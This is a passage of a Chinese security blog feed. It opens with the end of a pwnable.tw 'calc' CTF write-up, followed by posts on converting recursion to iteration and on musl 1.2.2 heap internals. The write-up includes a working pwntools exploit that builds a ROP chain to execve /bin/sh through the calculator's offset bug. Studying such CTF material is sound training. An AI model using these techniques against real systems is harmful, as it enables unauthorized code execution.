class="line">pop_ecx_ebx = <span class="number">0x080701d1</span> <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">pop_edx = <span class="number">0x080701aa</span> <span class="comment"># pop edx ; ret</span></span><br><span class="line"></span><br><span class="line">int_0x80 = <span class="number">0x08049a21</span></span><br><span class="line"></span><br><span class="line">read = <span class="number">0x806E6D0</span></span><br><span class="line">xsgetn = <span class="number">0x8053200</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x08049452</span></span><br><span class="line">bin_sh = <span class="number">0x80eb860</span></span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">offset = <span class="number">360</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">global</span> offset</span><br><span class="line">    pay = <span class="string">b&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset).encode() + <span class="string">b&#x27;+&#x27;</span> + <span class="built_in">str</span>(val).encode()</span><br><span class="line">    payload.append(pay)</span><br><span class="line">    offset += <span class="number">1</span></span><br><span class="line"><span class="comment">#read bin sh...</span></span><br><span class="line">add(xsgetn)</span><br><span class="line">add(main)</span><br><span class="line">add(<span class="number">0x80EC360</span>)</span><br><span class="line">add(bin_sh)</span><br><span class="line">add(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;=== Welcome to SECPROG calculator ===&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload) -<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(payload[i])</span><br><span class="line">    p.sendline(payload[i])</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exp again.</span></span><br><span class="line">payload = []</span><br><span class="line">offset = <span class="number">360</span></span><br><span class="line">add(pop_eax)</span><br><span class="line">add(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">add(pop_ecx_ebx)</span><br><span class="line">add(bin_sh + <span class="number">0x10</span>)</span><br><span class="line">add(bin_sh)</span><br><span class="line">add(pop_edx)</span><br><span class="line">add(bin_sh + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(int_0x80)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;=== Welcome to SECPROG calculator ===&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload) -<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(payload[i])</span><br><span class="line">    p.sendline(payload[i])</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析:&quot;&gt;&lt;/a&gt;题目分析:&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/10/20/pwnable-tw</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>任意递归写法转迭代写法2</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/13/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%952/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/13/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%952/</id>
    <published>2022-10-12T16:09:58.000Z</published>
    <updated>2022-10-12T16:16:29.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>感觉前面那个有点不优雅，改了一下，这次完全模拟C语言程序的栈结构，并且用两个变量pc和ret_value代表x86的eip 和 eax</p><p>新的Ctx:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Ctx</span>&#123;</span></span><br><span class="line"><span class="type">int</span> args;     <span class="comment">//参数</span></span><br><span class="line"><span class="type">int</span> vars;     <span class="comment">//局部变量</span></span><br><span class="line"><span class="type">int</span> ret_addr; <span class="comment">//返回地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在递归调用的时候模拟call 指令，为新的函数运行开辟栈空间，保存返回地址，并更改pc变量的值，当函数返回时，将返回值放到ret_value 变量中</p><h1 id="Example1-二叉树中序遍历"><a href="#Example1-二叉树中序遍历" class="headerlink" title="Example1: 二叉树中序遍历"></a>Example1: 二叉树中序遍历</h1><h2 id="递归写法"><a href="#递归写法" class="headerlink" title="递归写法:"></a>递归写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">travel_by_recursive</span><span class="params">(TreeNode*node)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">travel_by_recursive(node-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d\n&quot;</span>, node-&gt;val);</span><br><span class="line">travel_by_recursive(node-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代写法"><a href="#迭代写法" class="headerlink" title="迭代写法:"></a>迭代写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctx</span>&#123;</span></span><br><span class="line">TreeNode*node;<span class="comment">//传递给当前函数的参数.</span></span><br><span class="line"><span class="type">int</span> vars;<span class="comment">//局部变量,当前函数内的</span></span><br><span class="line"><span class="type">int</span> ret_addr;<span class="comment">//控制下一行代码.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">travel</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span>&#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;ctx&gt; s;</span><br><span class="line"><span class="type">int</span> pc, ret_value;</span><br><span class="line"><span class="comment">//第一次调用</span></span><br><span class="line">s.push(&#123; root, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line">ret_value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="comment">//执行当前函数内(ctx)的代码:</span></span><br><span class="line"><span class="keyword">auto</span> &amp; t = s.top();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> (t.node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">pc = t.ret_addr;</span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">s.push(&#123; t.node-&gt;left, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);<span class="comment">//travel_by_recursive(node-&gt;left);</span></span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d&quot;</span>, t.node-&gt;val);<span class="comment">//printf(&quot;val:%d\n&quot;, node-&gt;val);</span></span><br><span class="line">pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">s.push(&#123; t.node-&gt;right, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);<span class="comment">//travel_by_recursive(node-&gt;right);</span></span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">pc = t.ret_addr;<span class="comment">//函数返回.</span></span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Example2-分治法求无序数组中的最大值"><a href="#Example2-分治法求无序数组中的最大值" class="headerlink" title="Example2: 分治法求无序数组中的最大值"></a>Example2: 分治法求无序数组中的最大值</h1><h2 id="递归写法-1"><a href="#递归写法-1" class="headerlink" title="递归写法:"></a>递归写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_recursive</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (left == right || (right - left) == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> max(arr[left], arr[right]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> left_m = get_max_by_recursive(arr, left, (left + right) / <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> right_m = get_max_by_recursive(arr, (left + right) / <span class="number">2</span> + <span class="number">1</span>, right);</span><br><span class="line"><span class="keyword">return</span> max(left_m, right_m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代写法-1"><a href="#迭代写法-1" class="headerlink" title="迭代写法:"></a>迭代写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BSMaxCtx</span>&#123;</span></span><br><span class="line"><span class="comment">//args:</span></span><br><span class="line"><span class="type">int</span>*arr;</span><br><span class="line"><span class="type">int</span> left, right;</span><br><span class="line"><span class="comment">//局部变量</span></span><br><span class="line"><span class="type">int</span> left_m, right_m;</span><br><span class="line"><span class="comment">//返回地址.</span></span><br><span class="line"><span class="type">int</span> ret_addr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_iterate</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;BSMaxCtx&gt;s;<span class="comment">//esp...</span></span><br><span class="line"><span class="type">int</span> pc,ret_value;<span class="comment">//eip,eax.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一次调用</span></span><br><span class="line">s.push(&#123; arr, left, right, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line">ret_value = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; t = s.top();<span class="comment">//当前函数的运行上下文.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//判断终止条件</span></span><br><span class="line"><span class="keyword">if</span> (t.left == t.right || (t.left + <span class="number">1</span>) == t.right)&#123;</span><br><span class="line"><span class="comment">//save returna value -&gt; ret_value</span></span><br><span class="line">ret_value = max(t.arr[t.left], t.arr[t.right]);</span><br><span class="line"><span class="comment">//ret.</span></span><br><span class="line">pc = t.ret_addr;</span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, left, (left + right) / 2);</span></span><br><span class="line">s.push(&#123; t.arr, t.left, (t.left + t.right) / <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);</span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="comment">//left_m = eax;</span></span><br><span class="line">t.left_m = ret_value;</span><br><span class="line">pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, (left + right) / 2 + 1, right);</span></span><br><span class="line">s.push(&#123; t.arr, (t.left + t.right) / <span class="number">2</span> + <span class="number">1</span>, t.right, <span class="number">0</span>, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);</span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="comment">//right_m = eax;</span></span><br><span class="line">t.right_m = ret_value;</span><br><span class="line">pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="comment">//return max(left_m, right_m);</span></span><br><span class="line">ret_value = max(t.left_m, t.right_m);</span><br><span class="line">pc = t.ret_addr;</span><br><span class="line">s.pop();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;感觉前面那个有点不优雅，改了一下，这次完全模拟C语言程序的栈结构，并且用两个变量pc和ret_value代表x86的eip 和 eax&lt;/p</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>musl1.2.2堆管理机制-(3)free总览</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-3-free%E6%80%BB%E8%A7%88/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-3-free%E6%80%BB%E8%A7%88/</id>
    <published>2022-10-12T10:51:40.000Z</published>
    <updated>2022-10-12T10:52:14.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="free-流程总览"><a href="#free-流程总览" class="headerlink" title="free 流程总览"></a>free 流程总览</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-3-free%E6%80%BB%E8%A7%88/free.svg" alt="free.svg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;free-流程总览&quot;&gt;&lt;a href=&quot;#free-流程总览&quot; class=&quot;headerlink&quot; title=&quot;free 流程总览&quot;&gt;&lt;/a&gt;free 流程总览&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/202</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>musl1.2.2堆管理机制-(2)malloc总览</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-2-malloc%E6%80%BB%E8%A7%88/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-2-malloc%E6%80%BB%E8%A7%88/</id>
    <published>2022-10-12T10:48:54.000Z</published>
    <updated>2022-10-12T10:50:14.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc-流程总览"><a href="#malloc-流程总览" class="headerlink" title="malloc 流程总览"></a>malloc 流程总览</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-2-malloc%E6%80%BB%E8%A7%88/malloc.svg" alt="malloc.svg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;malloc-流程总览&quot;&gt;&lt;a href=&quot;#malloc-流程总览&quot; class=&quot;headerlink&quot; title=&quot;malloc 流程总览&quot;&gt;&lt;/a&gt;malloc 流程总览&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.githu</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>musl1.2.2堆管理机制-(1)</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-1/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-1/</id>
    <published>2022-10-12T10:44:01.000Z</published>
    <updated>2022-10-12T10:44:41.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-basic-data-structure"><a href="#1-basic-data-structure" class="headerlink" title="1. basic data structure"></a>1. basic data structure</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"><span class="type">uint8_t</span> flag;        <span class="comment">//</span></span><br><span class="line"><span class="type">uint8_t</span> idx:<span class="number">5</span>;       <span class="comment">//在当前group 中的索引</span></span><br><span class="line"><span class="type">uint8_t</span> reversed:<span class="number">3</span>;  <span class="comment">//</span></span><br><span class="line"><span class="type">uint16_t</span>offset;    <span class="comment">//UserData 距离 group-&gt; storage的偏移.</span></span><br><span class="line"><span class="type">char</span> UserData[];     <span class="comment">//保存用户数据.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//每个group 开头的数据,一共16 个字节.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;     <span class="comment">//active idx 有可能是小于last_idx的.</span></span><br><span class="line"><span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>]; <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//后面这些用来放chunk</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line"><span class="comment">//同一个active 里面保存的metas通过双向循环链表连接起来.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, </span></span><br><span class="line"><span class="class">*<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span>  <span class="comment">//指向group.</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> avail_mask,<span class="comment">//bitmap ,标记哪个chunk 是有效的. </span></span><br><span class="line">freed_mask;      <span class="comment">//bitmap ,标记哪个chunk 被释放了. </span></span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;  <span class="comment">//记录最后一个chunk的idx</span></span><br><span class="line"><span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">//所属的size class (是个index..)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个meta_area中可以分配出多个meta.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> check;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> nslots;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line"><span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> init_done;    <span class="comment">//初始化 secret.</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> mmap_counter;<span class="comment">//记录mmap的个数</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">//保存free 的meta</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span> <span class="comment">//这个是保存当前area中剩余未使用的部分</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> avail_meta_count,  <span class="comment">//这个是用来保存当前area中剩余的meta的个数...</span></span><br><span class="line"></span><br><span class="line">avail_meta_area_count, meta_alloc_shift;</span><br><span class="line"><span class="comment">//这个链表用来保存使用的area</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line"><span class="comment">//这个是用来保存未使用的areas区域 (.bss段后面未使用的)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span>  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> usage_by_class[<span class="number">48</span>];<span class="comment">//创建出来的group所包含的chunk总个数,</span></span><br><span class="line"><span class="comment">//包括被free的chunk和被alloc的chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 